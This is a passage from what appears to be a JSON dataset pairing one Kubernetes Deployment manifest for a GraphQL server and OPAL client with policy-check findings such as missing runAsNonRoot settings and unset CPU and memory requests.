persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"graphql-server\" is not set to runAsNonRoot"
  },
  {
    "id": "2689",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"opal-client\" is not set to runAsNonRoot"
  },
  {
    "id": "2690",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"graphql-server\" has cpu request 0"
  },
  {
    "id": "2691",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"opal-client\" has cpu request 0"
  },
  {
    "id": "2692",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"graphql-server\" has memory limit 0"
  },
  {
    "id": "2693",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "unset-memory-requirements",
